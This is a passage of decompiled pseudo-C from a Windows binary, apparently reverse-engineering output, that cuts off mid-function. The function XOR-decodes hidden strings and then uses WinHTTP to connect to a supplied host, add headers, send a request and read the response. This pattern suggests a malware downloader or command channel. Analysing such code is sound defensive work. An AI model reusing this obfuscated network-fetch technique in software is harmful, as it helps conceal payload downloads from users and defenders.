uchar var_193h;\n    uint var_190h;\n    uchar var_18ch;\n    uchar var_18bh;\n    uchar var_18ah;\n    uchar var_189h;\n    uchar var_188h;\n    uchar var_187h;\n    uchar var_186h;\n    uchar var_185h;\n    uchar var_184h;\n    uchar var_183h;\n    uchar var_182h;\n    uchar var_181h;\n    uchar var_180h;\n    uchar var_17fh;\n    uchar var_17eh;\n    uchar var_17dh;\n    uchar var_17ch;\n    uchar var_17bh;\n    uchar var_17ah;\n    uchar var_179h;\n    uchar var_178h;\n    uchar var_177h;\n    uchar var_176h;\n    uchar var_175h;\n    uchar var_174h;\n    uchar var_173h;\n    uchar var_172h;\n    uchar var_171h;\n    uchar var_170h;\n    uchar var_16fh;\n    uchar var_16eh;\n    uchar var_16dh;\n    uchar var_16ch;\n    uchar var_16bh;\n    uchar var_16ah;\n    uchar var_169h;\n    uchar var_168h;\n    uchar var_167h;\n    uchar var_166h;\n    uchar var_165h;\n    uint var_164h;\n    uchar var_160h;\n    uchar var_15fh;\n    uchar var_15eh;\n    uchar var_15dh;\n    uchar var_15ch;\n    uchar var_15bh;\n    uchar var_15ah;\n    uchar var_159h;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uchar var_150h;\n    uchar var_14fh;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uchar var_144h;\n    uchar var_143h;\n    uchar var_142h;\n    uchar var_141h;\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uint8_t var_13ch [4];\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uchar var_12bh;\n    uchar var_12ah;\n    uchar var_129h;\n    uchar var_128h;\n    uchar var_127h;\n    uchar var_126h;\n    uchar var_125h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uint var_118h;\n    uchar var_114h;\n    uchar var_113h;\n    uchar var_112h;\n    uchar var_111h;\n    uchar var_110h;\n    uchar var_10fh;\n    uchar var_10eh;\n    uchar var_10dh;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uint8_t var_f8h [4];\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uchar var_e8h;\n    uchar var_e7h;\n    uchar var_e6h;\n    uchar var_e5h;\n    uint8_t var_e4h [4];\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uint var_d0h;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uint var_bch;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uint8_t var_b4h [4];\n    uchar var_b0h;\n    uchar var_afh;\n    uint var_ach;\n    uchar var_a8h;\n    uchar var_a7h;\n    uint8_t var_a4h [4];\n    uchar var_a0h;\n    uchar var_9fh;\n    uint8_t var_9ch [4];\n    uchar var_98h;\n    uchar var_97h;\n    uint8_t var_94h [4];\n    uchar var_90h;\n    uchar var_8fh;\n    uint var_8ch;\n    uchar var_88h;\n    uint var_84h;\n    uchar var_80h;\n    uint var_7ch;\n    uchar var_78h;\n    uint var_74h;\n    uchar var_70h;\n    uint var_6ch;\n    uchar var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_44h = 0;\n    var_2b4h = 0;\n    var_20h = 0;\n    var_2c0h = 0xc;\n    if (arg_2ch != NULL) {\n        *arg_2ch = 0;\n    }\n    puVar5 = &var_3e4h;\n    for (iVar4 = 0x100; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &var_5ech;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_288h = 0;\n    iVar4 = fcn.0040ba00(arg_8h, &var_288h);\n    if (iVar4 == 0) {\n        var_280h = 3;\n    }\n    else {\n        var_2bch = 1;\n        var_2b8h = 0;\n        if (*0x4369d4 == 0) {\n            var_25ch._0_1_ = 0x1c;\n            var_25ch._1_1_ = 0x6d;\n            var_25ch._2_1_ = 4;\n            var_25ch._3_1_ = 0x49;\n            var_258h = 0x34;\n            var_257h = 0x46;\n            var_256h = 0x38;\n            var_255h = 0x6d;\n            var_254h = 7;\n            var_253h = 0x49;\n            var_252h = 0x22;\n            var_251h = 0x46;\n            var_250h = 0x30;\n            var_24fh = 0x6d;\n            var_24eh = 0x44;\n            var_24dh = 0x49;\n            var_24ch = 0x7b;\n            var_24bh = 0x46;\n            var_24ah = 0x7f;\n            var_249h = 0x6d;\n            var_248h = 0x5b;\n            var_247h = 0x49;\n            var_246h = 0x6e;\n            var_245h = 0x46;\n            var_244h = 0x79;\n            var_243h = 0x6d;\n            var_242h = 0x3c;\n            var_241h = 0x49;\n            var_240h = 0x27;\n            var_23fh = 0x46;\n            var_23eh = 0x3f;\n            var_23dh = 0x6d;\n            var_23ch = 0xf;\n            var_23bh = 0x49;\n            var_23ah = 0x21;\n            var_239h = 0x46;\n            var_238h = 0x26;\n            var_237h = 0x6d;\n            var_236h = 0x18;\n            var_235h = 0x49;\n            var_234h = 0x6e;\n            var_233h = 0x46;\n            var_232h = 0x1f;\n            var_231h = 0x6d;\n            var_230h = 0x3f;\n            var_22fh = 0x49;\n            var_22eh = 0x6e;\n            var_22dh = 0x46;\n            var_22ch = 0x67;\n            var_22bh = 0x6d;\n            var_22ah = 0x45;\n            var_229h = 0x49;\n            var_228h = 0x7f;\n            var_227h = 0x46;\n            var_226h = 0x6a;\n            var_225h = 0x6d;\n            var_224h = 0x4b;\n            var_223h = 0x49;\n            var_222h = 0x19;\n            var_221h = 0x46;\n            var_220h = 0x38;\n            var_21fh = 0x6d;\n            var_21eh = 5;\n            var_21dh = 0x49;\n            var_21ch = 0x78;\n            var_21bh = 0x46;\n            var_21ah = 0x65;\n            var_219h = 0x6d;\n            var_218h = 0x50;\n            var_217h = 0x49;\n            var_216h = 0x6e;\n            var_215h = 0x46;\n            var_214h = 0x29;\n            var_213h = 0x6d;\n            var_212h = 0x5d;\n            var_211h = 0x49;\n            var_210h = 0x7a;\n            var_20fh = 0x46;\n            var_20eh = 0x6a;\n            var_20dh = 0x6d;\n            var_20ch = 0x4b;\n            var_20bh = 0x49;\n            var_20ah = 0x3c;\n            var_209h = 0x46;\n            var_208h = 0x27;\n            var_207h = 0x6d;\n            var_206h = 0x51;\n            var_205h = 0x49;\n            var_204h = 0x7c;\n            var_203h = 0x46;\n            var_202h = 100;\n            var_201h = 0x6d;\n            var_200h = 0x45;\n            var_1ffh = 0x49;\n            var_1feh = 0x7e;\n            var_1fdh = 0x46;\n            var_1fch = 0x78;\n            var_1fbh = 0x6d;\n            var_1fah = 0x4b;\n            var_1f9h = 0x49;\n            var_1f8h = 9;\n            var_1f7h = 0x46;\n            var_1f6h = 0x34;\n            var_1f5h = 0x6d;\n            var_1f4h = 8;\n            var_1f3h = 0x49;\n            var_1f2h = 0x25;\n            var_1f1h = 0x46;\n            var_1f0h = 0x3e;\n            var_1efh = 0x6d;\n            var_1eeh = 0x44;\n            var_1edh = 0x49;\n            var_1ech = 0x7c;\n            var_1ebh = 0x46;\n            var_1eah = 0x60;\n            var_1e9h = 0x6d;\n            var_1e8h = 0x5b;\n            var_1e7h = 0x49;\n            var_1e6h = 0x7e;\n            var_1e5h = 0x46;\n            var_1e4h = 0x61;\n            var_1e3h = 0x6d;\n            var_1e2h = 0x5a;\n            var_1e1h = 0x49;\n            var_1e0h = 0x7e;\n            var_1dfh = 0x46;\n            var_1deh = 0x60;\n            var_1ddh = 0x6d;\n            var_1dch = 0x4b;\n            var_1dbh = 0x49;\n            var_1dah = 8;\n            var_1d9h = 0x46;\n            var_1d8h = 0x38;\n            var_1d7h = 0x6d;\n            var_1d6h = 0x19;\n            var_1d5h = 0x49;\n            var_1d4h = 0x2b;\n            var_1d3h = 0x46;\n            var_1d2h = 0x37;\n            var_1d1h = 0x6d;\n            var_1d0h = 4;\n            var_1cfh = 0x49;\n            var_1ceh = 0x36;\n            var_1cdh = 0x46;\n            var_1cch = 0x7e;\n            var_1cbh = 0x6d;\n            var_1cah = 0x59;\n            var_1c9h = 0x49;\n            var_1c8h = 0x7b;\n            var_1c7h = 0x46;\n            var_1c6h = 0x7f;\n            var_1c5h = 0x6d;\n            var_1c4h = 0x5b;\n            var_1c3h = 0x49;\n            var_1c2h = 0x4e;\n            var_1c1h = 0x46;\n            var_b4h[0] = 0x51;\n            var_b4h[1] = 0x6d;\n            var_b4h[2] = 0x6b;\n            var_b4h[3] = 0x49;\n            var_b0h = 0x4e;\n            var_afh = 0x46;\n            fcn.004012a0(0x138);\n            for (var_2ch = 0; var_2ch < 0x9c; var_2ch = var_2ch + 1) {\n                fcn.00401280(var_2ch, *(&var_25ch + var_2ch) ^ var_b4h[var_2ch % 6]);\n            }\n            uVar2 = fcn.00401270(0, 0, 0, 0);\n            *0x4369d4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(uVar2);\n            if (*0x4369d4 == 0) {\n                var_284h = 1;\n                fcn.004012d0();\n                return var_284h;\n            }\n            fcn.004012d0();\n        }\n        var_20h = arg_8h;\n        if (arg_8h == 0) {\n            var_27ch = 0;\n        }\n        else {\n            var_44h = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n            var_44h = var_44h + 1;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_44h * 2, var_20h, var_44h);\n            uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            var_27ch = fcn.0040b890(uVar2, unaff_ESI, var_5ech);\n        }\n        var_274h = var_27ch;\n        var_264h = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x4369d4, var_27ch, arg_24h, 0);\n        fcn.0040b8d0(var_264h);\n        var_118h._0_1_ = 0x1c;\n        var_118h._1_1_ = 0x51;\n        var_118h._2_1_ = 0x3e;\n        var_118h._3_1_ = 0x36;\n        var_114h = 0x24;\n        var_113h = 0x34;\n        var_112h = 4;\n        var_111h = 0x51;\n        var_110h = 0x39;\n        var_10fh = 0x36;\n        var_10eh = 0x6a;\n        var_10dh = 0x34;\n        var_10ch = 0x5b;\n        var_10bh = 0x51;\n        var_10ah = 0x65;\n        var_109h = 0x36;\n        var_108h = 0x75;\n        var_107h = 0x34;\n        var_106h = 7;\n        var_105h = 0x51;\n        var_104h = 0x70;\n        var_103h = 0x36;\n        var_102h = 0x75;\n        var_101h = 0x34;\n        var_100h = 0x10;\n        var_ffh = 0x51;\n        var_feh = 0x65;\n        var_fdh = 0x36;\n        var_fch = 0x50;\n        var_fbh = 0x34;\n        var_ach._0_1_ = 0x74;\n        var_ach._1_1_ = 0x51;\n        var_ach._2_1_ = 0x4a;\n        var_ach._3_1_ = 0x36;\n        var_a8h = 0x50;\n        var_a7h = 0x34;\n        fcn.004012a0(0x3c);\n        for (var_30h = 0; var_30h < 0x1e; var_30h = var_30h + 1) {\n            fcn.00401280(var_30h, *(&var_118h + var_30h) ^ *(&var_ach + var_30h % 6));\n        }\n        uVar2 = fcn.00401270(var_274h, 0x50);\n        (*_sym.imp.USER32.dll_wsprintfW)(&var_3e4h, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_274h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        if (var_264h == 0) {\n            var_280h = 1;\n            fcn.004012d0();\n            fcn.0040b8f0();\n        }\n        else {\n            var_298h = 0x800140;\n            var_48h = 0;\n            var_bch._0_1_ = 1;\n            var_bch._1_1_ = 0x31;\n            var_bch._2_1_ = 0x2f;\n            var_bch._3_1_ = 0x6b;\n            var_b8h = 0x23;\n            var_b7h = 0x46;\n            var_b6h = 0x31;\n            var_b5h = 0x6a;\n            var_8ch._0_1_ = 0x46;\n            var_8ch._1_1_ = 0x31;\n            var_8ch._2_1_ = 0x6a;\n            var_8ch._3_1_ = 0x6b;\n            var_88h = 0x77;\n            fcn.004012a0(0x10);\n            for (var_34h = 0; var_34h < 8; var_34h = var_34h + 1) {\n                fcn.00401280(var_34h, *(&var_bch + var_34h) ^ *(&var_8ch + var_34h % 5));\n            }\n            var_f8h[0] = 0x67;\n            var_f8h[1] = 0x52;\n            var_f8h[2] = 0x28;\n            var_f8h[3] = 100;\n            var_f4h = 0x2a;\n            var_f3h = 0x48;\n            var_f2h = 0x3d;\n            var_f1h = 0x5a;\n            var_f0h = 0;\n            var_efh = 0x48;\n            var_eeh = 0x31;\n            var_edh = 0x52;\n            var_ech = 0x69;\n            var_ebh = 100;\n            var_eah = 0x7a;\n            var_e9h = 0x48;\n            var_e8h = 0x62;\n            var_e7h = 0x5a;\n            var_e6h = 100;\n            var_e5h = 0x48;\n            var_84h._0_1_ = 0x48;\n            var_84h._1_1_ = 0x52;\n            var_84h._2_1_ = 0x5a;\n            var_84h._3_1_ = 100;\n            var_80h = 0x48;\n            uVar2 = 0x28;\n            fcn.004012a0(0x28);\n            for (var_38h = 0; var_38h < 0x14; var_38h = var_38h + 1) {\n                fcn.00401280(var_38h, var_f8h[var_38h] ^ *(&var_84h + var_38h % 5));\n            }\n            var_d0h._0_1_ = 0x41;\n            var_d0h._1_1_ = 0x35;\n            var_d0h._2_1_ = 0x1d;\n            var_d0h._3_1_ = 0x49;\n            var_cch = 0x26;\n            var_cbh = 0x6d;\n            var_cah = 1;\n            var_c9h = 0x35;\n            var_c8h = 0xb;\n            var_c7h = 0x49;\n            var_c6h = 0x3d;\n            var_c5h = 0x6d;\n            var_c4h = 0x5d;\n            var_c3h = 0x35;\n            var_c2h = 0x5d;\n            var_c1h = 0x49;\n            var_c0h = 0x44;\n            var_bfh = 0x6d;\n            var_a4h[0] = 0x6e;\n            var_a4h[1] = 0x35;\n            var_a4h[2] = 0x6f;\n            var_a4h[3] = 0x49;\n            var_a0h = 0x44;\n            var_9fh = 0x6d;\n            arg_ch_00 = 0x24;\n            fcn.004012a0(0x24);\n            for (var_3ch = 0; var_3ch < 0x12; var_3ch = var_3ch + 1) {\n                fcn.00401280(var_3ch, *(&var_d0h + var_3ch) ^ var_a4h[var_3ch % 6]);\n            }\n            var_e4h[0] = 0x5d;\n            var_e4h[1] = 0x39;\n            var_e4h[2] = 8;\n            var_e4h[3] = 0x6d;\n            var_e0h = 0x55;\n            var_dfh = 0x42;\n            var_deh = 0x1d;\n            var_ddh = 0x39;\n            var_dch = 0x1e;\n            var_dbh = 0x6d;\n            var_dah = 0x4e;\n            var_d9h = 0x42;\n            var_d8h = 0x44;\n            var_d7h = 0x39;\n            var_d6h = 0x4e;\n            var_d5h = 0x6d;\n            var_d4h = 0x37;\n            var_d3h = 0x42;\n            var_9ch[0] = 0x72;\n            var_9ch[1] = 0x39;\n            var_9ch[2] = 0x7a;\n            var_9ch[3] = 0x6d;\n            var_98h = 0x37;\n            var_97h = 0x42;\n            fcn.004012a0(0x24);\n            for (var_40h = 0; var_40h < 0x12; var_40h = var_40h + 1) {\n                fcn.00401280(var_40h, var_e4h[var_40h] ^ var_9ch[var_40h % 6]);\n            }\n            if (arg_14h == 0) {\n                if (arg_10h == 0x140) {\n                    var_48h = fcn.00401270();\n                }\n                else if (arg_10h == 0x20) {\n                    var_48h = fcn.00401270();\n                }\n                else {\n                    if (arg_10h != 0x40) {\n                        var_2b0h = 1;\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.004012d0();\n                        fcn.0040b8f0();\n                        return var_2b0h;\n                    }\n                    var_48h = fcn.00401270();\n                }\n            }\n            else {\n                var_20h = arg_14h;\n                if (arg_14h == 0) {\n                    var_278h = 0;\n                }\n                else {\n                    var_44h = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_14h);\n                    var_44h = var_44h + 1;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_44h * 2, var_20h, var_44h);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    var_278h = fcn.0040b890(uVar3, arg_ch_00, uVar2);\n                }\n                var_48h = var_278h;\n            }\n            uVar2 = fcn.00401270(var_48h, 0, 0, 0, var_298h);\n            var_4h = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)(var_264h, uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_48h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            fcn.0040b8d0(var_4h);\n            if (var_4h == 0) {\n                var_294h = 1;\n                fcn.0040b8f0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.0040b8f0();\n                var_280h = var_294h;\n            }\n            else {\n                var_28ch = 0x3300;\n                var_290h = 8;\n                puVar5 = &var_2d8h;\n                for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                puVar5 = &var_2e4h;\n                for (iVar4 = 0xc; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                var_2d8h = 1;\n                var_2d4h = 3;\n                var_2c4h = 1;\n                var_164h._0_1_ = 0x29;\n                var_164h._1_1_ = 0x68;\n                var_164h._2_1_ = 0x65;\n                var_164h._3_1_ = 0x6f;\n                var_160h = 0x33;\n                var_15fh = 0x71;\n                var_15eh = 0x1a;\n                var_15dh = 0x48;\n                var_15ch = 0;\n                var_15bh = 99;\n                var_15ah = 9;\n                var_159h = 0x68;\n                var_158h = 0x31;\n                var_157h = 0x6f;\n                var_156h = 0x4e;\n                var_155h = 0x71;\n                var_154h = 0x3d;\n                var_153h = 0x48;\n                var_152h = 0x1c;\n                var_151h = 99;\n                var_150h = 0x14;\n                var_14fh = 0x68;\n                var_14eh = 0x2c;\n                var_14dh = 0x6f;\n                var_14ch = 0x59;\n                var_14bh = 0x71;\n                var_14ah = 0x48;\n                var_149h = 0x48;\n                var_148h = 0x29;\n                var_147h = 99;\n                var_146h = 0x30;\n                var_145h = 0x68;\n                var_144h = 4;\n                var_143h = 0x6f;\n                var_142h = 0x30;\n                var_141h = 0x71;\n                var_140h = 0x2d;\n                var_13fh = 0x48;\n                var_13eh = 0x6f;\n                var_13dh = 99;\n                var_7ch._0_1_ = 0x71;\n                var_7ch._1_1_ = 0x68;\n                var_7ch._2_1_ = 0x48;\n                var_7ch._3_1_ = 0x6f;\n                var_78h = 99;\n                fcn.004012a0(0x50);\n                for (var_4ch = 0; var_4ch < 0x28; var_4ch = var_4ch + 1) {\n                    fcn.00401280(var_4ch, *(&var_164h + var_4ch) ^ *(&var_7ch + var_4ch % 5));\n                }\n                var_190h._0_1_ = 0x60;\n                var_190h._1_1_ = 0x61;\n                var_190h._2_1_ = 0x14;\n                var_190h._3_1_ = 0x37;\n                var_18ch = 0x33;\n                var_18bh = 0x68;\n                var_18ah = 0x4a;\n                var_189h = 0x61;\n                var_188h = 0x56;\n                var_187h = 0x37;\n                var_186h = 0x1b;\n                var_185h = 0x68;\n                var_184h = 0x41;\n                var_183h = 0x61;\n                var_182h = 0x14;\n                var_181h = 0x37;\n                var_180h = 0x33;\n                var_17fh = 0x68;\n                var_17eh = 0x4a;\n                var_17dh = 0x61;\n                var_17ch = 0x5c;\n                var_17bh = 0x37;\n                var_17ah = 0x10;\n                var_179h = 0x68;\n                var_178h = 0x5d;\n                var_177h = 0x61;\n                var_176h = 0x57;\n                var_175h = 0x37;\n                var_174h = 0x17;\n                var_173h = 0x68;\n                var_172h = 2;\n                var_171h = 0x61;\n                var_170h = 0x19;\n                var_16fh = 0x37;\n                var_16eh = 0x37;\n                var_16dh = 0x68;\n                var_16ch = 0x6a;\n                var_16bh = 0x61;\n                var_16ah = 0x6c;\n                var_169h = 0x37;\n                var_168h = 0x26;\n                var_167h = 0x68;\n                var_166h = 0x38;\n                var_165h = 0x61;\n                var_94h[0] = 0x38;\n                var_94h[1] = 0x61;\n                var_94h[2] = 0x39;\n                var_94h[3] = 0x37;\n                var_90h = 99;\n                var_8fh = 0x68;\n                fcn.004012a0(0x58);\n                for (var_50h = 0; var_50h < 0x2c; var_50h = var_50h + 1) {\n                    fcn.00401280(var_50h, *(&var_190h + var_50h) ^ var_94h[var_50h % 6]);\n                }\n                var_1c0h._0_1_ = 0x2c;\n                var_1c0h._1_1_ = 0x34;\n                var_1c0h._2_1_ = 0x1a;\n                var_1c0h._3_1_ = 0x41;\n                var_1bch = 0x1c;\n                var_1bbh = 0x74;\n                var_1bah = 0x46;\n                var_1b9h = 0x37;\n                var_1b8h = 0x2e;\n                var_1b7h = 0x4c;\n                var_1b6h = 0xc;\n                var_1b5h = 0x34;\n                var_1b4h = 0x4e;\n                var_1b3h = 0x41;\n                var_1b2h = 0x61;\n                var_1b1h = 0x74;\n                var_1b0h = 100;\n                var_1afh = 0x37;\n                var_1aeh = 0x33;\n                var_1adh = 0x4c;\n                var_1ach = 0x11;\n                var_1abh = 0x34;\n                var_1aah = 0x44;\n                var_1a9h = 0x41;\n                var_1a8h = 0x29;\n                var_1a7h = 0x74;\n                var_1a6h = 0x5a;\n                var_1a5h = 0x37;\n                var_1a4h = 0x35;\n                var_1a3h = 0x4c;\n                var_1a2h = 0x4e;\n                var_1a1h = 0x34;\n                var_1a0h = 0x17;\n                var_19fh = 0x41;\n                var_19eh = 10;\n                var_19dh = 0x74;\n                var_19ch = 0x75;\n                var_19bh = 0x37;\n                var_19ah = 0xd;\n                var_199h = 0x4c;\n                var_198h = 0x27;\n                var_197h = 0x34;\n                var_196h = 0x72;\n                var_195h = 0x41;\n                var_194h = 0x4c;\n                var_193h = 0x74;\n                var_74h._0_1_ = 0x74;\n                var_74h._1_1_ = 0x34;\n                var_74h._2_1_ = 0x37;\n                var_74h._3_1_ = 0x41;\n                var_70h = 0x4c;\n                fcn.004012a0(0x5c);\n                for (var_54h = 0; var_54h < 0x2e; var_54h = var_54h + 1) {\n                    fcn.00401280(var_54h, *(&var_1c0h + var_54h) ^ *(&var_74h + var_54h % 5));\n                }\n                uVar2 = fcn.00401270(0x10000000);\n                uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar2);\n                uVar2 = fcn.00401270(uVar2);\n                (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(var_4h, uVar2);\n                if (arg_28h == 0) {\n                    uVar2 = fcn.00401270(0x10000000);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar2);\n                    uVar2 = fcn.00401270(uVar2);\n                    (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(var_4h, uVar2);\n                }\n                else {\n                    uVar2 = fcn.00401270(0x10000000);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar2);\n                    uVar2 = fcn.00401270(uVar2);\n                    (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(var_4h, uVar2);\n                }\n                fcn.0040bc90(var_4h, 0, 0, 0);\n                (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(var_4h, 0x1f, &var_28ch, 4);\n                (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(var_4h, 0x3f, &var_290h, 4);\n                if (arg_20h != 0) {\n                    var_13ch[0] = 0x2b;\n                    var_13ch[1] = 0x49;\n                    var_13ch[2] = 0x20;\n                    var_13ch[3] = 0x72;\n                    var_138h = 0x36;\n                    var_137h = 0x79;\n                    var_136h = 0x2e;\n                    var_135h = 0x41;\n                    var_134h = 0x17;\n                    var_133h = 0x58;\n                    var_132h = 0x43;\n                    var_131h = 0x49;\n                    var_130h = 0x61;\n                    var_12fh = 0x72;\n                    var_12eh = 0x3a;\n                    var_12dh = 0x79;\n                    var_12ch = 0x30;\n                    var_12bh = 0x41;\n                    var_12ah = 6;\n                    var_129h = 0x58;\n                    var_128h = 0x1c;\n                    var_127h = 0x49;\n                    var_126h = 0x32;\n                    var_125h = 0x72;\n                    var_124h = 0x65;\n                    var_123h = 0x79;\n                    var_122h = 0x6c;\n                    var_121h = 0x41;\n                    var_120h = 0x16;\n                    var_11fh = 0x58;\n                    var_11eh = 0x54;\n                    var_11dh = 0x49;\n                    var_11ch = 0x41;\n                    var_11bh = 0x72;\n                    var_6ch._0_1_ = 0x79;\n                    var_6ch._1_1_ = 0x49;\n                    var_6ch._2_1_ = 0x41;\n                    var_6ch._3_1_ = 0x72;\n                    var_68h = 0x58;\n                    fcn.004012a0(0x44);\n                    for (var_58h = 0; var_58h < 0x22; var_58h = var_58h + 1) {\n                        fcn.00401280(var_58h, var_13ch[var_58h] ^ *(&var_6ch + var_58h % 5));\n                    }\n                    uVar2 = fcn.00401270(arg_20h);\n                    (*_sym.imp.USER32.dll_wsprintfW)(&var_3e4h, uVar2);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&var_3e4h, 0x10000000);\n                    (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(var_4h, &var_3e4h, uVar2);\n                    fcn.004012d0();\n                }\n                (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(var_4h, 0, 0xffffffff, 0, 0, 0, 0);\n                iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(var_4h, 0);\n                if (iVar4 == 0) {\n                    var_29ch = 1;\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.0040b8f0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.004012d0();\n                    fcn.0040b8f0();\n                    var_280h = var_29ch;\n                }\n                else {\n                    var_260h = 0;\n                    var_270h = 0;\n                    var_26ch = 4;\n                    (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(var_4h, 0x20000005, 0, &var_260h, &var_26ch, 0);\n                    if (*arg_18h == 0) {\n                        *arg_18h = var_260h;\n                    }\n                    var_26ch = 4;\n                    (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(var_4h, 0x20000013, 0, &var_270h, &var_26ch, 0);\n                    if ((var_270h == 0xce) || (var_270h == 200)) {\n                        if (arg_ch[1] == 0) {\n                            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_260h);\n                            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                            arg_ch[1] = iVar4;\n                            *arg_ch = 0;\n                        }\n                        cVar1 = fcn.0040ba40(var_4h, arg_ch[1], arg_ch);\n                        if (cVar1 == '\\0') {\n                            var_2a4h = 4;\n                            fcn.004012d0();\n                            fcn.004012d0();\n                            fcn.004012d0();\n                            fcn.0040b8f0();\n                            fcn.004012d0();\n                            fcn.004012d0();\n                            fcn.004012d0();\n                            fcn.004012d0();\n                            fcn.004012d0();\n                            fcn.0040b8f0();\n                            var_280h = var_2a4h;\n                        }\n                        else {\n                            *arg_1ch = *arg_ch;\n                            if ((*arg_18h == 0) || (*arg_ch == *arg_18h)) {\n                                var_2ach = 0;\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.0040b8f0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.004012d0();\n                                fcn.0040b8f0();\n                                var_280h = var_2ach;\n                            }\n                            else {\n                                var_2a8h = 6;\n                                fcn.004012d0();\n                                